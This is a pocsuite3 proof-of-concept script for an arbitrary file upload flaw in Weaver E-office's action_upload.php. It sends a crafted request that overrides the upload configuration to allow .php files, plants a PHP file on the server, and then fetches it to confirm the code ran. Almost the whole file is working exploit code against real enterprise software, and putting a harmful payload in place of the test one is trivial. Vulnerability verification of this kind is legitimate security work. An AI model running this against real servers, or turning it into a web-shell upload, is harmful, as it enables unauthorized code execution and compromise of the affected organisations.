from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 E-office action_upload.php 存在文件上传漏洞'
    appName = '泛微 E-office'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司E-office action_upload.php 存在文件上传漏洞，攻击者可利用该漏洞获取系统权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self, verify=True):
        result = {}
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
        }
        filename = "test567"
        path = '/newplugins/js/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=/newplugins/js/ueditor/php/test/'+filename+'&CONFIG[imageMaxSize]=10000&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=yourfile'
        files = {'yourfile': ('yourfile.php',"<?php echo md5('123456');@unlink(__file__);?>")}
        vul_url= self.url+path
        resp = requests.post(vul_url,headers=headers,files=files,allow_redirects=False,verify=False,timeout=10)
        if resp.status_code == 200:
            path1 = '/newplugins/js/ueditor/php/test/'+filename+'.php'
            vul_url1= self.url+path1
            resp1 = requests.get(vul_url1,headers=headers,allow_redirects=False,verify=False,timeout=10)
            if resp1.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in resp1.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Content'] = vul_url1
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
